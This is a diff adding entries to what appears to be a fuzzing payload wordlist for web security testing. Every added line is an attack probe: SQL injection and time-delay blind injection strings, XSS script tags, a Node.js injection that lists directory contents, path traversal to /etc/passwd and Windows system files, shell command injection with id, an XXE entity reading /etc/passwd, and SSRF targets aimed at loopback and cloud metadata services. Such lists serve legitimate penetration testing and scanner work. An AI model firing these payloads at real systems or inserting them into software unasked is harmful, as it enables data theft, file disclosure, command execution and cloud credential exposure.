@@ -1,6 +1,58 @@
 asdf'
+asdf'--
 asdf''
 1'
+1'--
 1''
-asdf">
+' or 1=1--
+' or '1'-'1
+' or '1'='1'--
+waitfor delay '0:5:0'--
+;waitfor delay '0:5:0'--
+);waitfor delay '0:5:0'--
+';waitfor delay '0:5:0'--
+');waitfor delay '0:5:0'--
+";waitfor delay '0:5:0'--
+");waitfor delay '0:5:0'--
+SLEEP(5)#
+1 or SLEEP(5)#
+" or SLEEP(5)#
+' or SLEEP(5)#
+pg_sleep(5)--
+;pg_sleep(5)--
+);pg_sleep(5)--
+';pg_sleep(5)--
+');pg_sleep(5)--
+";pg_sleep(5)--
+");pg_sleep(5)--
+<script>alert(1)</script>
+asdf"><script>alert(1)</script>
 asdf);alert(1);//
+");console.log(1);
+");res.end(require('fs').readdirSync('.').toString());
+../../../../../../../../../../etc/passwd
+../../../../../../../../../../boot.ini
+../../../../../../../../../../Windows/win.ini
+../../../../../../../../../../Windows/System32/Drivers/etc/hosts
+..\..\..\..\..\..\..\..\..\..\etc\passwd
+..\..\..\..\..\..\..\..\..\..\boot.ini
+..\..\..\..\..\..\..\..\..\..\Windows/win.ini
+..\..\..\..\..\..\..\..\..\..\Windows\System32\Drivers\etc\hosts
+| id
+&& id
+; id
+`id`
+$(id)
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]>
+//127.0.0.1
+//localhost
+//[::]
+//127.1
+//127.0.1
+//127-0-0-1.nip.io
+//169.254.169.254/latest/user-data
+//metadata.google.internal/computeMetadata/v1/instance/hostname
+//metadata.google.internal/computeMetadata/v1beta1/instance/hostname
+//169.254.169.254/metadata/v1/user-data
+//169.254.169.254/metadata/v1/maintenance
+//a.co
